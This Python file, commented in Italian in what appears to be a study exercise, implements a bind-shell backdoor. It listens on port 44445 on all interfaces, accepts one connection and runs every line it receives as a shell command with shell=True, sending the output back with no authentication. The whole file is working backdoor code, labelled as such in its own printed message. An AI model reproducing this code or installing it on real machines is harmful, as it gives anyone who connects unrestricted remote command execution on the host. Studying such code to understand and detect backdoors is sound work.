import socket as so
import subprocess

# non so dove verra' esguita meglio usare tutte le schede e lo spigo con 0.0.0.0
SRV_ADDR = "0.0.0.0"
SRV_PORT = 44445

# prima di poter usare socket devo chiamare 
# socket e' estremamente generico qui chiedo ipv4 e tcp
s = so.socket(so.AF_INET, so.SOCK_STREAM)

# prima di usarlo lo devo configurare
# voglio chiedergli di configurarsi in ascolto
s.bind((SRV_ADDR, SRV_PORT))

# spiego quante connessioni puo' accettare
s.listen(1)

print(f"Backdoor in ascolto su {SRV_PORT}")
# Arrivati a questo punto quando do s.accept() attedera' che una connessione venga stabilita
# accept crea una tupla, la connessione stessa e delle informazioni
connection, address = s.accept()
# a questo punto il programma riprende
print("Connesso con:", address)
# avvio un ciclo infinito
while True:
    # mando un messaggio
    connection.sendall(b"shell#: ")
    # attendo la sua risposta per max 1024 caratteri
    # data = connection.recv(1024) # dati binari
    # data = data.decode('utf-8') # converto i dati in stringa
    # data = data.strip() # pulsico la stringa da sporcature come l'accapo ("\n")
    # preferisco fare tutto in una sola riga
    data = connection.recv(1024).decode('utf-8').strip()

    # se il sock chiude la connessione o l'utente chiede di uscire chiudo il ciclo infinito 
    if not data or data == "exit": break
    
    # ESECUZIONE COMANDO
    # shell=True permetto di usare comandi concatenati (es. ls -la | grep txt)
    # capture_output cattuttura i messaggi stdout e stderr, rispettivamente testo ed errori
    proc = subprocess.run(data, shell=True, capture_output=True)

    # Invio il risultato
    output = proc.stdout + proc.stderr

    if not output: output = b"OK\n"

    connection.sendall(output)

# se esce dal ciclo chiudo la connessione, cosi' libero la porta
connection.close()


